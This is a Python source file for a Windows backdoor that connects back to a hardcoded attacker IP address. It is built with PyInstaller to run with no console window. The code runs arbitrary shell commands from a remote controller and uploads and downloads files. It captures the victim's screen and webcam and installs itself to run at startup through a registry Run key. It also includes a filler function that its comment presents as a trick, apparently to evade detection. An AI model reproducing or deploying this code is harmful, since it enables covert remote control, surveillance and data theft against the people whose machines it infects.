#pyinstaller backdoor.py --onefile --noconsole

# Import necessary libraries

import socket
import json
import subprocess
import os
import pyautogui
import cv2
import shutil
import sys
import time

# Function to send data reliably over the socket, encoding the data as JSON
def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())

# Function to receive data reliably over the socket, decoding JSON data

def reliable_recv():
    data =''
    while True:
        try:
            data=data+s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to download a file from the controller to the target machine

def download_file(file_name):
    f=open(file_name,'wb')
    s.settimeout(1)
    chunk=s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
# Function to upload a file from the target machine to the controller

def upload_file(file_name):
    f=open(file_name,'rb')
    s.send(f.read())

# Function to take a screenshot on the target machine

def screenshot():
    myScreenshot=pyautogui.screenshot()
    myScreenshot.save('screen.png')


# Function to enable persistence on the target machine by copying itself
# to a specified location and adding a registry key for autostart
def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')
    
# Function to take a webcam snapshot on the target machine

def webcam():
    cam_port=0
    cam=cv2.VideoCapture(cam_port)
    result,webcamshot=cam.read()
    if result:
        cv2.imwrite('webshot.png',webcamshot)
    else:
        print('could not take webshot')


# Function to connect to the controller, retrying every 20 seconds if unsuccessful

def connection():
    while True:
        time.sleep(20)
        try:
            #bellow is IP of the attacker machine so the victim can connect to it
            s.connect(('192.168.0.14',5555))
            shell()
            s.close()
            break
        except:
            connection()


# Function to add numbers until the total reaches 100 or more
# Random functions sometimes tricks

def add_until_100():
    total = 0
    while total < 100:
        num = 10 # Set the number to be added to 10
        total += num
    return total

# Function to receive and execute commands from the controller

def shell():
     while True:
        add_until_100()
        command=reliable_recv()
        if command=='quit':
            break
        elif command=='help':
            pass
        elif command=='clear':
            pass
        elif command[:3]=='cd ':
            os.chdir(command[3:])
        elif command[:6]=='upload':
            download_file(command[7:])
        elif command[:8]=='download':
            upload_file(command[9:])
        elif command[:10]=='screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command=='webcamshot':
            webcam()
            upload_file('webshot.png')
            os.remove('webshot.png')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name) 
        else:
            execute=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result=execute.stdout.read()+execute.stderr.read()
            result=result.decode()
            reliable_send(result)


# Create a socket object and establish a connection with the controller

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection()